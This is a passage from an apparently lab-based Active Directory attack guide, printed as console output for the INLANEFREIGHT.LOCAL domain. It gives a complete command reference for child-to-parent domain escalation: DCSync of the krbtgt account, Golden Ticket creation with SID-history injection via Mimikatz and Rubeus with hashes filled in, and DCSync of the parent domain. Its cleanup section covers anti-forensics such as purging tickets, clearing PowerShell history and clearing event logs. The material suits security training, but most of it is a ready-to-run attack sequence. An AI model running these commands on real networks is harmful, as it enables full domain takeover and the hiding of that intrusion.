
6. ENUMERATE ADMIN ACCOUNTS:
   Get-DomainGroupMember -Domain INLANEFREIGHT.LOCAL -Identity 'Domain Admins'
   Get-DomainGroupMember -Domain INLANEFREIGHT.LOCAL -Identity 'Enterprise Admins'

7. LATERAL MOVEMENT:
   # Use extracted hashes for Pass-the-Hash attacks
   # Create Silver Tickets for specific services
   # Access other domain controllers and servers

+---------------------------------------------------------------+
¦              CLEANUP & OPSEC                                  ¦
+---------------------------------------------------------------+

[!] Remember to clean up after the engagement:
    • Clear Kerberos tickets: klist purge
    • Remove created accounts: net user backdoor /delete
    • Clear PowerShell history: Clear-History
    • Remove tools from disk
    • Clear Windows Event Logs (if authorized)

+---------------------------------------------------------------+
¦              COMPLETE COMMAND REFERENCE                       ¦
+---------------------------------------------------------------+

All commands used in this attack:
????????????????????????????????????????????????????????????
# 1. DCSync child domain KRBTGT
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

# 2. Get child domain SID
Get-DomainSID

# 3. Get Enterprise Admins SID
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid

# 4. Test access (before)
ls \\INLANEFREIGHT.LOCAL\c$

# 5. Create Golden Ticket (Mimikatz)
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# 6. Create Golden Ticket (Rubeus)
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

# 7. Verify ticket
klist

# 8. Test access (after)
ls \\INLANEFREIGHT.LOCAL\c$

# 9. DCSync parent domain
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
????????????????????????????????????????????????????????????

[+] Attack guide completed!
[+] You now have full control over the parent domain: INLANEFREIGHT.LOCAL

[*] Good luck and happy hunting! ??

PS C:\Tools>
